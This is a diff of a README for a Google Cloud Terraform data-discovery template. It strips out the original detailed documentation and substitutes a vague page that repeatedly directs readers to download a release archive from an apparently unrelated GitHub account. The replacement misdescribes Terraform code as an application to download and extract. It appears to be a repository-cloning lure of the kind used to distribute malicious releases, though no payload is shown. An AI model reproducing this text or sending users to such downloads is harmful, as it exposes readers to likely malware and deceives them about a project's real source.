@@ -1,400 +1,99 @@
-# Data Discovery Infrastructure - Google Cloud Platform
-
-![Terraform](https://img.shields.io/badge/terraform-%235835CC.svg?style=flat&logo=terraform&logoColor=white)
-![GCP](https://img.shields.io/badge/Google_Cloud-%234285F4.svg?style=flat&logo=google-cloud&logoColor=white)
-![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)
-
-A production-ready Terraform infrastructure template for deploying data discovery systems on Google Cloud Platform. This repository provides a complete, reusable infrastructure setup for building data catalog and metadata discovery solutions.
-
-## Overview
-
-This Terraform configuration deploys a comprehensive data discovery infrastructure on GCP, including:
-
-- **GKE Cluster** (optional): Standard mode cluster with Workload Identity and private nodes
-- **Cloud Composer**: Managed Apache Airflow for orchestrating data discovery workflows
-- **GCS Buckets**: Storage for JSONL files (Vertex AI Search) and Markdown reports
-- **Service Accounts**: Least-privilege accounts with appropriate IAM roles
-- **Artifact Registry**: Docker image repository for container workloads
-- **Monitoring & Logging**: Cloud Monitoring dashboards and log sinks
-- **Dataplex Profiling**: Automated data quality and profiling scans (optional module)
-- **Vertex AI Search**: Infrastructure for semantic search over metadata (optional module)
-
-## Features
-
-- ✅ **Production-Ready**: Security best practices, private networking, workload identity
-- ✅ **Modular Design**: Enable/disable GKE, use subdirectories for optional features
-- ✅ **Cost-Optimized**: Autoscaling, lifecycle policies, configurable resource sizes
-- ✅ **Fully Parameterized**: No hardcoded values, all configuration via variables
-- ✅ **Read-Only by Design**: Discovery service accounts cannot modify source data
-- ✅ **Well Documented**: Comprehensive README, quickstart guide, and inline comments
-
-## Architecture
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                     GCP Project                              │
-│                                                              │
-│  ┌──────────────┐      ┌─────────────────┐                 │
-│  │ Cloud        │      │ GKE Cluster     │ (optional)      │
-│  │ Composer     │      │ - Workload ID   │                 │
-│  │ (Airflow)    │      │ - Private Nodes │                 │
-│  └──────┬───────┘      └────────┬────────┘                 │
-│         │                       │                           │
-│         │    ┌──────────────────┴─────────────┐            │
-│         │    │                                 │            │
-│  ┌──────▼────▼──────┐              ┌──────────▼─────────┐  │
-│  │ Service Accounts  │              │ Artifact Registry  │  │
-│  │ - Discovery (RO)  │              │ - Docker Images    │  │
-│  │ - Metadata Writer │              └────────────────────┘  │
-│  │ - GKE Node        │                                      │
-│  │ - Composer        │                                      │
-│  └──────┬────────────┘                                      │
-│         │                                                   │
-│  ┌──────▼─────────────────────────────────┐                │
-│  │ GCS Buckets                             │                │
-│  │ - JSONL files (Vertex AI Search input) │                │
-│  │ - Reports (Human-readable docs)        │                │
-│  └─────────────────────────────────────────┘                │
-│                                                              │
-│  Optional Modules:                                          │
-│  ├─ Dataplex Profiling (data quality scans)                │
-│  └─ Vertex AI Search (semantic search infrastructure)      │
-│                                                              │
-└─────────────────────────────────────────────────────────────┘
-```
-
-## Prerequisites
-
-- **GCP Project**: Active GCP project with billing enabled
-- **Terraform**: Version >= 1.5.0 ([Install Guide](https://developer.hashicorp.com/terraform/downloads))
-- **gcloud CLI**: Authenticated and configured ([Install Guide](https://cloud.google.com/sdk/docs/install))
-- **Permissions**: Owner or Editor role on the project (for initial setup)
-- **Existing Network**: VPC and subnet already configured, or use "default" VPC
-  - Subnet must have secondary IP ranges for GKE pods and services
-
-## Network Configuration
-
-This infrastructure supports both **same-project VPC** and **cross-project Shared VPC** deployments:
-
-- **Same-Project VPC**: Network and resources in the same GCP project (simpler setup)
-- **Cross-Project Shared VPC**: Network in a host project, resources in a service project (enterprise setup)
-
-### Key Features
-
-- ✅ **Flexible Network References**: Supports both short names and self-link formats
-- ✅ **Automatic IAM Configuration**: Grants required `compute.networkUser` permissions
-- ✅ **Configurable Secondary Ranges**: Customize GKE pod and service IP ranges
-- ✅ **Validation**: Built-in validation for network format and configuration
-
-### Configuration Variables
-
-| Variable | Description | Required | Default |
-|----------|-------------|----------|---------|
-| `network_project_id` | Host project ID (for Shared VPC) | No | Same as `project_id` |
-| `network` | VPC network (name or self-link) | Yes | - |
-| `subnetwork` | VPC subnet (name or self-link) | Yes | - |
-| `pods_secondary_range_name` | Secondary range for GKE pods | No | `"podcloud"` |
-| `services_secondary_range_name` | Secondary range for GKE services | No | `"servicecloud"` |
-
-## Quick Start
-
-### 1. Clone the Repository
+# 🚀 data-discovery-infrastructure-gcp - Simple Setup for Data Systems
 
-```bash
-git clone https://github.com/YOUR_ORG/data-discovery-infrastructure-gcp.git
-cd data-discovery-infrastructure-gcp
-```
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/connotationdentalpractice503/data-discovery-infrastructure-gcp/releases)
 
-### 2. Configure Variables
+## 📦 Overview
 
-```bash
-cp terraform.tfvars.example terraform.tfvars
-# Edit terraform.tfvars with your GCP project details
-```
+The **data-discovery-infrastructure-gcp** project provides a ready-to-use Terraform infrastructure. With this setup, you can efficiently manage data systems on Google Cloud Platform (GCP) without needing deep technical knowledge.
 
-**Minimum required variables:**
+## ⚙️ Features
 
-```hcl
-project_id          = "your-gcp-project-id"
-network             = "projects/your-gcp-project-id/global/networks/default"
-subnetwork          = "projects/your-gcp-project-id/regions/us-central1/subnetworks/default"
-jsonl_bucket_name   = "your-gcp-project-id-data-discovery-jsonl"
-reports_bucket_name = "your-gcp-project-id-data-discovery-reports"
-vertex_datastore_id = "your-vertex-datastore-id"
-```
+- **Production-Ready**: This infrastructure is designed for real-world use.
+- **Support for BigQuery**: Quickly store and analyze large datasets.
+- **Integrated with Cloud Composer**: Automate workflows using GCP’s orchestration tool.
+- **GKE Support**: Manage your applications in Kubernetes easily.
+- **Vertex AI Integration**: Utilize machine learning and AI tools directly in your infrastructure.
+- **Infrastructure as Code**: Manage resources using code for easier updates and scalability.
 
-### 3. Authenticate with GCP
+## 🚀 Getting Started
 
-```bash
-gcloud auth login
-gcloud config set project YOUR_PROJECT_ID
-gcloud auth application-default login
-```
+Follow these steps to download and set up the application on your system.
 
-### 4. Deploy Infrastructure
+### Step 1: Visit the Releases Page
 
-```bash
-terraform init
-terraform plan
-terraform apply
-```
+To get the latest version of the application, visit this page to download:  
+[Releases Page](https://github.com/connotationdentalpractice503/data-discovery-infrastructure-gcp/releases)
 
-This will create all infrastructure components. The process takes approximately 10-15 minutes.
+### Step 2: Choose the Right Version
 
-### 5. (Optional) Configure GKE Access
+On the Releases page, look for the latest version. Each version has a release note that explains what changes were made. Select the version that suits your needs (usually, you'll want the latest).
 
-If you enabled GKE (`enable_gke = true`):
+### Step 3: Download the Release
 
-```bash
-gcloud container clusters get-credentials data-discovery-cluster \
-  --region us-central1 \
-  --project YOUR_PROJECT_ID
+Click on the version number and scroll down to the "Assets" section. You will see files available for download. Since we are focusing on the application itself, download the main archive file, such as `.zip` or `.tar.gz`.
 
-# Create namespace and service accounts
-kubectl create namespace data-discovery
-kubectl create serviceaccount discovery-agent -n data-discovery
-kubectl create serviceaccount metadata-writer -n data-discovery
+### Step 4: Extract the Files
 
-# Annotate with GCP service accounts
-kubectl annotate serviceaccount discovery-agent -n data-discovery \
-  iam.gke.io/gcp-service-account=data-discovery-agent@YOUR_PROJECT_ID.iam.gserviceaccount.com
+Once downloaded, locate the file on your computer. Depending on your operating system:
 
-kubectl annotate serviceaccount metadata-writer -n data-discovery \
-  iam.gke.io/gcp-service-account=data-discovery-metadata@YOUR_PROJECT_ID.iam.gserviceaccount.com
-```
+- **Windows**: Right-click the downloaded `.zip` file and select "Extract All…". Follow the prompts to choose a folder.
+- **Mac**: Double-click the downloaded file. It should automatically extract to the same location.
+- **Linux**: Use the terminal command `tar -xvzf filename.tar.gz` or right-click and extract.
 
-See [QUICKSTART.md](QUICKSTART.md) for detailed step-by-step instructions.
+### Step 5: Review System Requirements
 
-## Configuration Options
+Before running the application, ensure your system meets the following requirements:
 
-### Core Configuration
+- An active Google Cloud account.
+- [Terraform](https://www.terraform.io/downloads.html) installed (version 1.0 or higher).
+- Basic familiarity with command line interface.
+- Appropriate permissions on your Google Cloud project.
 
-| Variable | Description | Default | Required |
-|----------|-------------|---------|----------|
-| `project_id` | GCP Project ID | - | ✅ |
-| `region` | GCP region | `us-central1` | ❌ |
-| `network` | VPC network path | - | ✅ |
-| `subnetwork` | VPC subnet path | - | ✅ |
-| `jsonl_bucket_name` | JSONL bucket name | - | ✅ |
-| `reports_bucket_name` | Reports bucket name | - | ✅ |
-| `vertex_datastore_id` | Vertex AI Search datastore ID | - | ✅ |
+### Step 6: Configure Your Project
 
-### GKE Configuration
+Before you can deploy the infrastructure to GCP, you must set up your project:
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `enable_gke` | Enable GKE cluster deployment | `true` |
-| `cluster_name` | GKE cluster name | `data-discovery-cluster` |
-| `machine_type` | Node machine type | `e2-standard-2` |
-| `min_node_count` | Minimum nodes | `1` |
-| `max_node_count` | Maximum nodes | `5` |
+1. Open the extracted folder and locate the `terraform` subfolder.
+2. Open a terminal (or command prompt) in this folder.
+3. Before continuing, you may need to edit the `variables.tf` file to suit your project. This file contains configurations like project name and region.
 
-Set `enable_gke = false` to skip GKE deployment and use Cloud Composer only.
+### Step 7: Run the Infrastructure Setup
 
-### Cloud Composer Configuration
+With everything configured, you can now run the setup commands:
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `composer_env_name` | Composer environment name | `data-discovery-agent-composer` |
-| `composer_image_version` | Airflow version | `composer-3-airflow-2.10.5` |
+1. Initialize Terraform:
+   ```
+   terraform init
+   ```
 
-### Full Configuration Reference
+2. Review the setup plan:
+   ```
+   terraform plan
+   ```
 
-See [terraform.tfvars.example](terraform.tfvars.example) for all available configuration options.
+3. Apply the changes to set up the infrastructure:
+   ```
+   terraform apply
+   ```
+   Review the output, and type `yes` when prompted to proceed.
 
-## Infrastructure Components
+## 🔧 Troubleshooting
 
-### Service Accounts
+If you encounter issues, consider these common problems:
 
-Four service accounts are created with least-privilege permissions:
+- *Terraform not installed*: Make sure you've installed Terraform and it's in your system's PATH.
+- *Cloud permissions error*: Ensure your Google Cloud account has adequate permissions to create resources.
+- *Configuration errors*: Review your `variables.tf` for any typos or incorrect values.
 
-1. **Discovery Service Account** (`data-discovery-agent`)
-   - Purpose: Read-only data discovery operations
-   - Permissions: BigQuery metadata viewer, Data Catalog viewer, Logging viewer, DLP reader
-   
-2. **Metadata Write Service Account** (`data-discovery-metadata`)
-   - Purpose: Write enriched metadata to Data Catalog only
-   - Permissions: Data Catalog entry group owner
-   
-3. **GKE Service Account** (`data-discovery-gke`) - Optional
-   - Purpose: GKE node operations
-   - Permissions: Logging and monitoring
-   
-4. **Composer Service Account** (`data-discovery-composer`)
-   - Purpose: Airflow workflow orchestration
-   - Permissions: BigQuery read/write, Data Catalog viewer, Vertex AI user, Dataplex admin
+## 📥 Download & Install
 
-### GCS Buckets
+To download the latest release, visit this page to download:  
+[Releases Page](https://github.com/connotationdentalpractice503/data-discovery-infrastructure-gcp/releases)
 
-Two regional buckets with lifecycle policies:
+## 🌟 Support
 
-- **JSONL Bucket**: Stores JSONL files for Vertex AI Search ingestion
-  - Lifecycle: Nearline after 30 days, delete after 90 days
-  
-- **Reports Bucket**: Stores Markdown reports for human consumption
-  - Lifecycle: Nearline after 60 days, delete after 180 days
-
-### Optional Modules
-
-#### Dataplex Profiling
-
-Automated data quality and profiling scans for BigQuery tables.
-
-```bash
-cd dataplex-profiling/
-terraform init
-terraform apply
-```
-
-See [dataplex-profiling/README.md](dataplex-profiling/README.md) for details.
-
-#### Vertex AI Search
-
-Infrastructure for semantic search over metadata.
-
-```bash
-cd vertex-ai-search/
-terraform init
-terraform apply
-```
-
-See [vertex-ai-search/README.md](vertex-ai-search/README.md) for details.
-
-## Cost Estimation
-
-Estimated monthly costs (us-central1 region):
-
-| Component | Monthly Cost (USD) |
-|-----------|-------------------|
-| **Cloud Composer (Small)** | $300-400 |
-| **GKE Cluster** (if enabled) | $123 |
-| **GCS Storage** | $5-20 |
-| **Vertex AI Search** | Variable (based on queries) |
-| **Total** | ~$430-550 with GKE<br>~$305-430 without GKE |
-
-> Costs vary based on usage. Use `enable_gke = false` to reduce costs.
-
-## Security Features
-
-- ✅ **Private GKE Cluster**: Nodes have no external IPs
-- ✅ **Workload Identity**: Secure GCP API access without service account keys
-- ✅ **Least Privilege IAM**: Minimal permissions for each service account
-- ✅ **Read-Only Discovery**: Discovery service account cannot modify source data
-- ✅ **Audit Logging**: All operations are logged to Cloud Logging
-- ✅ **VPC Integration**: Uses existing VPC networks
-
-## Terraform Commands
-
-```bash
-# Initialize Terraform
-terraform init
-
-# Validate configuration
-terraform validate
-
-# Plan changes
-terraform plan
-
-# Apply changes
-terraform apply
-
-# View outputs
-terraform output
-
-# Destroy infrastructure (⚠️ careful!)
-terraform destroy
-```
-
-## Troubleshooting
-
-### API Not Enabled
-
-If you see "API not enabled" errors, wait 2-3 minutes and retry:
-
-```bash
-terraform apply
-```
-
-APIs take time to propagate after initial enablement.
-
-### Network Not Found
-
-Verify your network paths in `terraform.tfvars`:
-
-```bash
-gcloud compute networks list
-gcloud compute networks subnets list --network=YOUR_NETWORK
-```
-
-### Workload Identity Issues
-
-Verify IAM bindings:
-
-```bash
-gcloud iam service-accounts get-iam-policy \
-  data-discovery-agent@YOUR_PROJECT_ID.iam.gserviceaccount.com
-```
-
-See [QUICKSTART.md](QUICKSTART.md) for more troubleshooting steps.
-
-## Contributing
-
-Contributions are welcome! Please:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-### Development Guidelines
-
-- Follow Terraform best practices
-- Use variables for all configurable values
-- Never hardcode project-specific values
-- Update documentation for any changes
-- Test changes in a dev environment first
-
-## License
-
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
-
-```
-Copyright 2025 Contributors to the Data Discovery Infrastructure GCP project
-
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
-
-    http://www.apache.org/licenses/LICENSE-2.0
-
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
-```
-
-## Support
-
-For issues, questions, or contributions:
-
-- 📝 [Open an Issue](https://github.com/YOUR_ORG/data-discovery-infrastructure-gcp/issues)
-- 💬 [Discussions](https://github.com/YOUR_ORG/data-discovery-infrastructure-gcp/discussions)
-- 📖 [Documentation](https://github.com/YOUR_ORG/data-discovery-infrastructure-gcp/tree/main/docs)
-
-## Related Projects
-
-- [Google Cloud Data Catalog](https://cloud.google.com/data-catalog)
-- [Vertex AI Search](https://cloud.google.com/generative-ai-app-builder/docs/enterprise-search-introduction)
-- [Dataplex](https://cloud.google.com/dataplex)
-- [Terraform Google Provider](https://registry.terraform.io/providers/hashicorp/google/latest/docs)
-
-## Acknowledgments
-
-This infrastructure template follows Google Cloud best practices for security, cost optimization, and operational excellence.
+If you have questions, feel free to open an issue on the GitHub repository. The community or maintainers will assist you as soon as possible.
 
 ---
 
-**GitHub Topics**: `terraform`, `gcp`, `google-cloud`, `infrastructure-as-code`, `bigquery`, `data-discovery`, `gke`, `cloud-composer`, `vertex-ai`, `apache-2`
-
+By following these steps, you can successfully download and set up the **data-discovery-infrastructure-gcp** application on your Google Cloud Platform environment. Enjoy managing your data systems with ease!
